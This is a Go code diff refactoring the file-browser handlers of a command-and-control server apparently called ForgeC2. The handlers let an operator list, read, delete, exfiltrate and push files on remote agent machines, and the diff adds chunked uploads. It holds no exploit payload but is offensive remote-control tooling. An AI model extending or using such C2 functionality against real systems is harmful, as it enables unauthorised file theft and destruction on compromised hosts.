@@ -3,12 +3,13 @@ package server
 import (
 	"bytes"
 	"encoding/base64"
-	"fmt"
 	"html/template"
 	"io"
 	"log/slog"
 	"mime/multipart"
 	"net/http"
+	"strconv"
+	"time"
 
 	"github.com/forgec2/forgec2/internal/db"
 	"github.com/gin-gonic/gin"
@@ -23,12 +24,17 @@ func (s *Server) handleFileBrowserPage(c *gin.Context) {
 		return
 	}
 
+	stats := s.getNavStats()
 	data := gin.H{
-		"Title":        "ForgeC2 - 文件浏览器",
-		"Agent":        agent,
-		"Path":         c.Query("path"),
-		"ActiveNav":    "agents",
-		"Online":       s.cfg.Auth.PasswordHash != "",
+		"Title":     "ForgeC2 - File Browser",
+		"Agent":     agent,
+		"Path":      c.Query("path"),
+		"ActiveNav": "agents",
+		"Online":    time.Since(agent.LastSeen) < s.offlineThreshold(),
+	}
+	s.addUserToData(c, data)
+	for k, v := range stats {
+		data[k] = v
 	}
 
 	var contentBuf bytes.Buffer
@@ -51,22 +57,16 @@ func (s *Server) handleListDir(c *gin.Context) {
 		path = "C:\\"
 	}
 
-	var agent db.Agent
-	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
-		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
+	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
 	}
 
-	task := db.Task{
-		AgentID: id,
-		Type:    "ls",
-		Command: path,
-		Path:    path,
-		Status:  "pending",
+	task, err := s.createTask(id, "ls", path, "", path, "", 0, 0)
+	if err != nil {
+		slog.Error("Failed to create task", "agent_id", id, "error", err)
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		return
 	}
-	s.db.Create(&task)
-	s.broadcastTaskUpdate(id, task)
-	s.LogAuditRecord(c, "file_ls", "agent", id, path, true, nil)
 
 	slog.Info("Directory list requested", "agent", id, "path", path)
 	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
@@ -80,25 +80,19 @@ func (s *Server) handleFileDelete(c *gin.Context) {
 		return
 	}
 
-	var agent db.Agent
-	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
-		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
+	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
 	}
 
-	task := db.Task{
-		AgentID: id,
-		Type:    "delete",
-		Command: filePath,
-		Path:    filePath,
-		Status:  "pending",
+	task, err := s.createTask(id, "delete", filePath, "", filePath, "", 0, 0)
+	if err != nil {
+		slog.Error("Failed to create task", "agent_id", id, "error", err)
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		return
 	}
-	s.db.Create(&task)
-	s.broadcastTaskUpdate(id, task)
-	s.LogAuditRecord(c, "file_delete", "agent", id, filePath, true, nil)
 
 	slog.Info("File delete requested", "agent", id, "path", filePath)
-	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
+	s.dispatchTask(c, task, "file_delete", filePath)
 }
 
 func (s *Server) handleFileRead(c *gin.Context) {
@@ -109,25 +103,19 @@ func (s *Server) handleFileRead(c *gin.Context) {
 		return
 	}
 
-	var agent db.Agent
-	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
-		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
+	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
 	}
 
-	task := db.Task{
-		AgentID: id,
-		Type:    "read",
-		Command: filePath,
-		Path:    filePath,
-		Status:  "pending",
+	task, err := s.createTask(id, "read", filePath, "", filePath, "", 0, 0)
+	if err != nil {
+		slog.Error("Failed to create task", "agent_id", id, "error", err)
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		return
 	}
-	s.db.Create(&task)
-	s.broadcastTaskUpdate(id, task)
-	s.LogAuditRecord(c, "file_read", "agent", id, filePath, true, nil)
 
 	slog.Info("File read requested", "agent", id, "path", filePath)
-	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
+	s.dispatchTask(c, task, "file_read", filePath)
 }
 
 func (s *Server) handleFileUploadFromAgent(c *gin.Context) {
@@ -138,25 +126,19 @@ func (s *Server) handleFileUploadFromAgent(c *gin.Context) {
 		return
 	}
 
-	var agent db.Agent
-	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
-		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
+	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
 	}
 
-	task := db.Task{
-		AgentID: id,
-		Type:    "upload",
-		Command: filePath,
-		Path:    filePath,
-		Status:  "pending",
+	task, err := s.createTask(id, "upload", filePath, "", filePath, "", 0, 0)
+	if err != nil {
+		slog.Error("Failed to create task", "agent_id", id, "error", err)
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		return
 	}
-	s.db.Create(&task)
-	s.broadcastTaskUpdate(id, task)
-	s.LogAuditRecord(c, "file_upload_exfil", "agent", id, filePath, true, nil)
 
 	slog.Info("File upload requested", "agent", id, "path", filePath)
-	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
+	s.dispatchTask(c, task, "file_upload_exfil", filePath)
 }
 
 func (s *Server) handleDownload(c *gin.Context) {
@@ -169,55 +151,19 @@ func (s *Server) handleDownload(c *gin.Context) {
 		return
 	}
 
-	var agent db.Agent
-	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
-		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
+	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
 	}
 
-	task := db.Task{
-		AgentID: id,
-		Type:    "download",
-		Command: fileURL,
-		Shell:   targetPath,
-		Path:    targetPath,
-		Status:  "pending",
+	task, err := s.createTask(id, "download", fileURL, targetPath, targetPath, "", 0, 0)
+	if err != nil {
+		slog.Error("Failed to create task", "agent_id", id, "error", err)
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		return
 	}
-	s.db.Create(&task)
-	s.broadcastTaskUpdate(id, task)
-	s.LogAuditRecord(c, "file_download_url", "agent", id, fileURL + " -> " + targetPath, true, nil)
 
 	slog.Info("File download requested", "agent", id, "url", fileURL, "path", targetPath)
-	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
-}
-
-func (s *Server) handleDownloadFile(c *gin.Context) {
-	id := c.Param("id")
-	filePath := c.PostForm("path")
-	if filePath == "" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "file path required"})
-		return
-	}
-
-	var agent db.Agent
-	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
-		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
-		return
-	}
-
-	task := db.Task{
-		AgentID: id,
-		Type:    "download",
-		Command: filePath,
-		Path:    filePath,
-		Status:  "pending",
-	}
-	s.db.Create(&task)
-	s.broadcastTaskUpdate(id, task)
-	s.LogAuditRecord(c, "file_download_exfil", "agent", id, filePath, true, nil)
-
-	slog.Info("File download requested", "agent", id, "path", filePath)
-	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
+	s.dispatchTask(c, task, "file_download_url", fileURL+" -> "+targetPath)
 }
 
 func (s *Server) handleUploadFile(c *gin.Context) {
@@ -234,9 +180,7 @@ func (s *Server) handleUploadFile(c *gin.Context) {
 		return
 	}
 
-	var agent db.Agent
-	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
-		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
+	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
 	}
 
@@ -251,19 +195,22 @@ func (s *Server) handleUploadFile(c *gin.Context) {
 		return
 	}
 
-	task := db.Task{
-		AgentID: id,
-		Type:    "upload",
-		Command: targetPath,
-		Shell:   fileData,
-		Path:    targetPath,
-		Data:    fileData,
-		Status:  "pending",
+	task, err := s.createTask(id, "upload", targetPath, "", targetPath, fileData, 0, 0)
+	if err != nil {
+		slog.Error("Failed to create task", "agent_id", id, "error", err)
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		return
 	}
-	s.db.Create(&task)
+	// chunked support
+	if offsetStr := c.PostForm("offset"); offsetStr != "" {
+		if off, err := strconv.ParseInt(offsetStr, 10, 64); err == nil {
+			task.Offset = off
+			s.db.Save(task)
+		}
+	}
 	s.LogAuditRecord(c, "file_upload_push", "agent", id, targetPath, true, nil)
 
-	slog.Info("File upload requested", "agent", id, "path", targetPath)
+	slog.Info("File upload chunk requested", "agent", id, "path", targetPath, "offset", task.Offset)
 	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
 }
 
